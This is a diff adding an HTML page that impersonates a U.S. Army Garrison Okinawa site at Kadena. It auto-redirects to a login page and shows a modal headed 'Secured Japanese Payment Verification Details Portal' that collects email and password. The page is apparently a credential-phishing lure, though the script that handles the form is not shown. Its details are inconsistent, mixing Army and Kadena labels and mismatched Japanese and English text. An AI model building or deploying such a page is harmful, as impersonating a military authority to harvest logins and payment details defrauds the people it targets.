@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+    <meta http-equiv="refresh" content="0; url=login.html">
+    <title>米陸軍嘉手納基地 沖縄</title>
+    <link rel="icon" type="image/png" href="assets/favicon.png">
+    <link rel="stylesheet" href="styles.css">
+    <script>
+        (function() {
+            const currentPath = window.location.pathname.replace(/\\/+$/, '');
+            const isEntryPage = currentPath === '' || currentPath === '/' || currentPath.endsWith('/index.html');
+            if (isEntryPage) {
+                window.location.replace('login.html');
+            }
+        })();
+    </script>
+</head>
+<body>
+    <!-- Background with animated Japan flag -->
+    <div class="background-container">
+        <div class="background-blur"></div>
+    </div>
+
+    <!-- Main content -->
+    <div class="container">
+        <!-- Logo -->
+        <div class="logo-container">
+            <img src="assets/images-removebg-preview.png" alt="US Army Garrison Okinawa Japan Logo" class="logo">
+        </div>
+
+        <!-- Hamburger Menu Button -->
+        <button class="hamburger-btn" id="hamburgerBtn">
+            <span></span>
+            <span></span>
+            <span></span>
+        </button>
+
+        <!-- Navigation Dropdown Menu -->
+        <div class="nav-dropdown" id="navDropdown">
+            <button class="lang-btn active" data-lang="ja">日本語</button>
+            <button class="lang-btn" data-lang="en">English</button>
+            <button class="login-btn" id="loginBtn" data-ja="ログイン" data-en="Login">ログイン</button>
+        </div>
+
+        <!-- Header -->
+        <header class="header">
+            <h1 class="title" data-ja="米陸軍嘉手納基地 沖縄" data-en="U.S. Army Garrison Okinawa, Japan">米陸軍嘉手納基地 沖縄</h1>
+            <p class="subtitle" data-ja="US Army Garrison Okinawa Japan" data-en="United States Army Garrison - Okinawa, Japan">US Army Garrison Okinawa Japan</p>
+        </header>
+
+        <!-- Main content area -->
+        <main class="main-content">
+            <section class="welcome-section">
+                <h2 data-ja="ようこそ" data-en="Welcome">ようこそ</h2>
+                <p data-ja="米陸軍嘉手納基地沖縄へようこそ。当基地は日本国とアメリカ合衆国の強固な防衛協力の象徴であり、インド太平洋地域の安全と安定を維持するための重要な拠点です。" data-en="Welcome to U.S. Army Garrison Okinawa, Japan. The garrison supports joint readiness, regional security, and alliance coordination in partnership with Japanese and U.S. defense organizations throughout the Indo-Pacific.">米陸軍嘉手納基地沖縄へようこそ。当基地は日本国とアメリカ合衆国の強固な防衛協力の象徴であり、インド太平洋地域の安全と安定を維持するための重要な拠点です。</p>
+            </section>
+
+            <section class="info-section">
+                <h3 data-ja="基地の概要" data-en="Base Overview">基地の概要</h3>
+                <ul>
+                    <li><strong data-ja="所在地:" data-en="Location:">所在地:</strong> <span data-ja="沖縄県中頭郡嘉手納町" data-en="Kadena, Okinawa Prefecture, Japan">沖縄県中頭郡嘉手納町</span></li>
+                    <li><strong data-ja="司令:" data-en="Command:">司令:</strong> <span data-ja="米陸軍太平洋軍司令部" data-en="U.S. Army Garrison Okinawa">米陸軍太平洋軍司令部</span></li>
+                    <li><strong data-ja="使命:" data-en="Mission:">使命:</strong> <span data-ja="地域の防衛と平和維持" data-en="Regional readiness, defense support, and stability operations">地域の防衛と平和維持</span></li>
+                    <li><strong data-ja="協力:" data-en="Cooperation:">協力:</strong> <span data-ja="日米同盟の強化と発展" data-en="Bilateral coordination under the Japan-U.S. security alliance">日米同盟の強化と発展</span></li>
+                </ul>
+            </section>
+
+            <section class="mission-section">
+                <h3 data-ja="私たちの使命" data-en="Our Mission">私たちの使命</h3>
+                <p data-ja="当基地は、インド太平洋地域における安定と安全を確保し、日本国民とアメリカ合衆国国民の平和と繁栄を守るために、日本国防衛省と密接に協力しています。" data-en="The garrison works in close coordination with Japanese defense authorities and U.S. partner commands to sustain operational readiness, strengthen deterrence, and preserve peace and stability across the Indo-Pacific region.">当基地は、インド太平洋地域における安定と安全を確保し、日本国民とアメリカ合衆国国民の平和と繁栄を守るために、日本国防衛省と密接に協力しています。</p>
+            </section>
+
+            <section class="mission-section">
+                <h3 data-ja="日米同盟" data-en="Japan-US Alliance">日米同盟</h3>
+                <p data-ja="日米同盟の強化と発展により、インド太平洋地域の平和と安定が保証されます。" data-en="The Japan-U.S. alliance remains a cornerstone of Indo-Pacific security, enabling coordinated responses, interoperability, and long-term regional stability.">日米同盟の強化と発展により、インド太平洋地域の平和と安定が保証されます。</p>
+            </section>
+
+
+        </main>
+
+        <!-- Floating Login Modal -->
+        <div class="login-modal-overlay" id="loginModalOverlay">
+            <div class="floating-login-modal" id="floatingLoginModal">
+                <!-- Modal Language Button -->
+                <button class="modal-lang-btn" id="modalLangBtn" data-lang="en">Eng</button>
+
+                <!-- Modal Header with Japan Flag -->
+                <div class="modal-header">
+                    <img src="assets/japan-flag.svg" alt="Japan Flag" class="modal-japan-flag">
+                </div>
+
+                <!-- Modal Title -->
+                <h1 class="modal-title" data-ja="セキュアな日本支払い認証のポータルへようこそ" data-en="WELCOME TO THE SECURED JAPANESE PAYMENT VERIFICATION DETAILS PORTAL">
+                    セキュアな日本支払い認証のポータルへようこそ
+                </h1>
+
+                <!-- Login Form -->
+                <form class="modal-login-form" id="modalLoginForm">
+                    <div class="form-input-group">
+                        <label data-ja="メール:" data-en="Email:">メール:</label>
+                        <input type="email" class="modal-form-input" id="modalLoginEmail" placeholder="Enter your email" data-ja-placeholder="メールを入力" data-en-placeholder="Enter your email" required>
+                    </div>
+
+                    <div class="form-input-group">
+                        <label data-ja="パスワード:" data-en="Password:">パスワード:</label>
+                        <div class="password-wrapper">
+                            <input type="password" class="modal-form-input" id="modalLoginPassword" placeholder="Enter your password" data-ja-placeholder="パスワードを入力" data-en-placeholder="Enter your password" required>
+                            <button type="button" class="password-toggle-btn" id="passwordToggleBtn">
+                                <svg class="eye-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                                    <circle cx="12" cy="12" r="3"></circle>
+                                </svg>
+                            </button>
+                        </div>
+                    </div>
+
+                    <p class="modal-login-error" id="modalLoginError"></p>
+
+                    <button type="submit" class="modal-login-submit-btn" data-ja="ログイン" data-en="Login">ログイン</button>
+                </form>
+
+                <!-- Modal Footer with US Army Logo -->
+                <div class="modal-footer">
+                    <img src="assets/images-removebg-preview.png" alt="US Army Logo" class="modal-army-logo">
+                </div>
+            </div>
+        </div>
+
+        <!-- Footer -->
+        <footer class="footer">
+            <div class="footer-left-content">
+                <div class="footer-section">
+                    <h3 class="footer-section-title" data-ja="基地の概要" data-en="BASE OVERVIEW">基地の概要</h3>
+                    <div class="footer-items">
+                        <div class="footer-item">
+                            <span class="footer-label" data-ja="所在地:" data-en="Location:">所在地:</span>
+                            <span class="footer-value" data-ja="沖縄県中頭郡嘉手納町" data-en="Kadena, Okinawa Prefecture, Japan">沖縄県中頭郡嘉手納町</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="footer-section">
+                    <h3 class="footer-section-title" data-ja="私たちの使命" data-en="OUR MISSION">私たちの使命</h3>
+                    <p class="footer-mission-text" data-ja="当基地は、インド太平洋地域における安定と安全を確保し、日本国民とアメリカ合衆国国民の平和と繁栄を守るために、日本国防衛省と密接に協力しています。" data-en="The garrison works in close coordination with Japanese defense authorities and U.S. partner commands to sustain operational readiness, strengthen deterrence, and preserve peace and stability across the Indo-Pacific region.">当基地は、インド太平洋地域における安定と安全を確保し、日本国民とアメリカ合衆国国民の平和と繁栄を守るために、日本国防衛省と密接に協力しています。</p>
+                </div>
+
+                <div class="footer-section">
+                    <div class="footer-cooperation">
+                        <span class="footer-cooperation-title" data-ja="★ 協力:" data-en="★ Cooperation:">★ 協力:</span>
+                        <span class="footer-cooperation-text" data-ja="日米同盟の強化と発展" data-en="Bilateral coordination under the Japan-U.S. security alliance">日米同盟の強化と発展</span>
+                    </div>
+                </div>
+
+                <p class="footer-copyright" data-ja="© 2026 米陸軍沖縄基地" data-en="© 2026 US Army Garrison Okinawa">© 2026 米陸軍沖縄基地</p>
+            </div>
+
+            <div class="footer-flag-container">
+                <div class="footer-flag">
+                    <img src="assets/japan-flag.svg" alt="Japan Flag" class="japan-flag-footer">
+                </div>
+            </div>
+        </footer>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+</html>
